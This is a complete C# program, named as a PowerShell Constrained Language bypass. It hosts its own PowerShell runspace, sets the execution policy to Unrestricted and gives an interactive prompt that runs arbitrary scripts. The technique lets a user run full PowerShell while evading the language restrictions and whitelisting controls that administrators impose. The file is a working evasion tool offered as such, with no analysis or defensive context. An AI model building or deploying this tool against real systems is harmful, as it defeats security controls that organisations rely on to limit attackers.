using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.ObjectModel;
using System.Text;

namespace PowerShellConstrainedLanguageBypass {
    public class Program {
        public static void Main(string[] args) {
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();

            RunspaceInvoke runSpaceInvoker = new RunspaceInvoke(runspace);
            runSpaceInvoker.Invoke("Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process");

            string cmd = "";
            do {
                Console.Write("PS > ");
                cmd = Console.ReadLine();

                if (!string.IsNullOrEmpty(cmd)) {

                    using (Pipeline pipeline = runspace.CreatePipeline()) {

                        try {
                            pipeline.Commands.AddScript(cmd);
                            pipeline.Commands.Add("Out-String");

                            Collection<PSObject> results = pipeline.Invoke();
                            StringBuilder stringBuilder = new StringBuilder();

                            foreach (PSObject obj in results) {
                                stringBuilder.AppendLine(obj.ToString());
                            }

                            Console.Write(stringBuilder.ToString());
                        }

                        catch (Exception ex) {
                            Console.WriteLine("{0}", ex.Message);
                        }
                    }
                }
            } while (cmd != "exit");
        }
    }
}
